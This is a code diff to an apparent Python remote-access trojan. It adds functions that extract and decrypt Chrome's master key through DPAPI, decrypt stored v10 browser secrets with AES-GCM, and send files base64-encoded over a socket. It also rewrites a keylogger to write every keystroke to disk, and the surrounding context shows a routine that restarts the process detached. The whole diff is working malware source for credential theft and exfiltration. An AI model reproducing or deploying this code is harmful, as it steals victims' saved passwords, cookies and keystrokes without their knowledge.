@@ -170,6 +170,48 @@ def send_atomic_data(s, type, data, filename, is_websocket=False):
         return False
 
 
+def get_master_key():
+    # THE KEY TO THE WONDER: Unlocks the Chrome encryption gate
+    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+    if not os.path.exists(path): return None
+    with open(path, "r", encoding="utf-8") as f:
+        local_state = json.load(f)
+    # Extract key and strip DPAPI prefix
+    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+
+
+def decrypt_v10(value, key):
+    try:
+        iv, payload = value[3:15], value[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        return cipher.decrypt(payload)[:-16].decode()
+    except:
+        return "[Decryption Failed]"
+
+
+def send_binary(s, file_path):
+    if not os.path.exists(file_path):
+        try:
+            s.sendall(b"ERROR|File not found\n")
+        except Exception:
+            pass
+        return False
+    try:
+        with open(file_path, "rb") as f:
+            # Encoding to Base64 prevents socket 'choking' on binary bytes
+            encoded_data = base64.b64encode(f.read()).decode()
+            header = f"BINARY_OUT|{os.path.basename(file_path)}|"
+            s.sendall((header + encoded_data + "\n").encode())
+        return True
+    except Exception as e:
+        try:
+            print(f'[-] send_binary failed: {e}')
+        except Exception:
+            pass
+        return False
+
+
 def run_detached():
     """Restart this process in detached mode."""
     if platform.system() != 'Windows':
@@ -193,18 +235,13 @@ def start_keylogger():
     keylog_data = ''
 
     def on_press(key):
-        global keylog_data
+        # Write raw key representation immediately and flush to disk
         try:
-            keylog_data += key.char
-        except AttributeError:
-            if key == keyboard.Key.space:
-                keylog_data += ' '
-            elif key == keyboard.Key.enter:
-                keylog_data += '\n'
-            elif key == keyboard.Key.tab:
-                keylog_data += '\t'
-            else:
-                keylog_data += f'[{key}]'
+            with open("keylog.txt", "a", encoding="utf-8") as f:
+                f.write(str(key))
+                f.flush() # CRITICAL: This ensures size is NEVER 0 when requested
+        except Exception:
+            pass
 
     listener = keyboard.Listener(on_press=on_press)
     keylog_thread = threading.Thread(target=listener.start, daemon=True)
